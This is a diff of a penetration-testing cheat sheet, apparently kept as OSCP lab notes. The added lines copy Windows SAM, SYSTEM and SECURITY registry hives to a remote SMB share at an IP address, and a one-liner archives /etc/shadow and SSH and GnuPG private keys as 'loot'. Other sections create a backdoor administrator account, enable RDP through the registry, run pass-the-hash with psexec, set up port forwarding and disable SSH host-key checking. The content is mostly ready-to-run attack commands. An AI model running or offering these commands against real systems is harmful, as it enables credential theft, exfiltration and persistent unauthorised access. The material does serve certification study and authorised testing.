-copy %WINDIR%\repair\sam \\ATTACKER_IP\share\sam.save
-copy %WINDIR%\repair\system \\ATTACKER_IP\share\system.save
+copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.save
+copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.save
+copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.save
 ```
 
 Then, on attack box:
@@ -1735,6 +1972,35 @@ psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc administrator@VICTIM_IP whoa
 # other options: xfreerdp, crackmapexec, pth-winexe
 ```
 
+## 7.4. Linux Files of Interest
+
+```sh
+# quick command to grab the goods
+tar zcf loot.tar.gz \
+/etc/passwd{,-} \
+/etc/shadow{,-} \
+"/etc/ssh/ssh_host_*" \
+"/home/*/.ssh/id*" \
+"/home/*/.gnupg" \
+"/root/.ssh/id*" \
+"/root/proof.txt"
+```
+
+## 7.5. Data Wrangling on Linux
+
+Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
+be able to quickly sift through it to get the parts you care about.
+
+### 7.5.1. Awk & Sed
+
+```sh
+# grab lines of text between start and end delimiters.
+awk '/PAT1/,/PAT2/' # includes start and end lines
+awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims
+sed -n '/PAT1/,/PAT2/{//!p;}' FILE
+sed '/PAT1/,/PAT2/!d;//d' FILE
+```
+
 # 8. Windows Persistence
 
 ## 8.1. Add RDP User
@@ -1743,11 +2009,21 @@ psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc administrator@VICTIM_IP whoa
 net user hacker P@$$w0rd /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
+:: enable remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 :: delete user
 net user hacker /del
+:: disable remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 ```
 
-## 8.2. Change Windows Domain Credentials
+## 8.2. Connect to Windows RDP
+
+```sh
+xfreerdp /u:username /p:password +clipboard /cert:ignore /size:960x680 /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot /v:VICTIM_IP
+```
+
+## 8.3. Change Windows Domain Credentials
 
 If you want to change the password of a user on a windows domain:
 
@@ -1913,4 +2189,16 @@ netsh interface portproxy add v4tov4 listenport=4445 listenaddress=WIN_EXT_IP co
 
 :: you also need to open a firewall rule to allow your inbound 4445 traffic
 netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
+```
+
+# 11. Miscellaneous
+
+## 11.1. Disable SSH Host Key Checking
+
+Put this at the top of your `~/.ssh/config` to disable it for all hosts:
+
+```
+Host *
+   StrictHostKeyChecking no
+   UserKnownHostsFile=/dev/null
 ```
